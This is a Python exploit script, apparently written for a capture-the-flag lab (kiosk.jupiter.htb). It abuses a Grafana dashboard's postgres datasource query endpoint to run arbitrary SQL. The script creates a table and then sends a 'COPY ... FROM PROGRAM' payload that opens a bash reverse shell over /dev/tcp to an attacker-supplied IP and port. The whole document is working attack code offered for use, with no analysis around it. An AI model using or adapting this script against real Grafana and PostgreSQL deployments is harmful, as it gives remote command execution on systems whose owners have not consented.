import re, time
import json, threading
import requests, sys, os
from bs4 import BeautifulSoup

attackerIP = str(input("Enter Your IP: "))
attackerPort = str(input("Enter Your Listener Port: "))

url = 'http://kiosk.jupiter.htb/api/ds/query'
headers = {
    'Host': 'kiosk.jupiter.htb',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d',
    'Content-Type': 'application/json',
    'x-dashboard-uid': 'jMgFGfA4z',
    'x-datasource-uid': 'YItSLg-Vz',
    'x-grafana-org-id': '1',
    'x-panel-id': '24',
    'x-plugin-id': 'postgres',
    'Origin': 'http://kiosk.jupiter.htb',
    'Content-Length': '484',
    'Connection': 'close'
}
data = {
    'queries': [
        {
            'refId': 'A',
            'datasource': {
                'type': 'postgres',
                'uid': 'YItSLg-Vz'
            },
            'rawSql': 'FLOOF',
            'format': 'table',
            'datasourceId': 1,
            'intervalMs': 60000,
            'maxDataPoints': 620
        }
    ],
    'range': {
        'from': '2023-06-20T14:36:41.006Z',
        'to': '2023-06-20T20:36:41.006Z',
        'raw': {
            'from': 'now-6h',
            'to': 'now'
        }
    },
    'from': '1687271801006',
    'to': '1687293401006'
}

def sendReq(ind):
    if ind == 0:
        print("[+] Preparing CMD_EXEC Table")

        nData = json.loads(json.dumps(data).replace("FLOOF", "CREATE TABLE cmd_exec(cmd_output text);"))
        req = requests.post(url, json=nData, headers=headers)
        # print(req.content)
    elif ind == 1:

        payload = f'COPY cmd_exec FROM PROGRAM \'bash -c \\"bash -i >& /dev/tcp/{attackerIP}/{attackerPort} 0>&1\\"\''

        print("[+] Sending Payload")

        nData = json.loads(json.dumps(data).replace("FLOOF", payload))
        req = requests.post(url, json=nData, headers=headers)
        # print(req.content)
    elif ind == 2:
        print(ind)

        nData = json.loads(json.dumps(data).replace("FLOOF", "SELECT * FROM cmd_exec;"))
        req = requests.post(url, json=nData, headers=headers)
        # print(req.content)

def showUsage():
    print("[*] Usage: python3 autoShell.py")

# Defining main function
def main():
    if len(sys.argv) == 1:
        for i in range(3):
            sendReq(i)
    else:
        showUsage()
  
if __name__=="__main__":
    main()
